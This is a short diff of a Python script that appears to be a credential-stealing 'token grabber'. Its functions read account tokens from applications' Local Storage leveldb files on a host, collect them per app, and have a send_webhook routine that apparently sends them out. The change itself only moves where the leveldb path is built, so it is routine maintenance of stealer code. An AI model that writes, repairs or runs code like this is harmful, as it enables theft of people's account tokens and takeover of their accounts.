@@ -198,7 +198,6 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
 
 
 def get_tokens(path: str) -> List[str]:
-    path = os.path.join(path, "Local Storage", "leveldb")
     tokens = []
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
@@ -216,6 +215,7 @@ def get_tokens(path: str) -> List[str]:
 def get_accounts(host: Computer) -> dict:
     accounts = {}
     for app_name, path in host.get_paths().items():
+        path = os.path.join(path, "Local Storage", "leveldb")
         if not os.path.exists(path):
             continue
         for token in get_tokens(path):
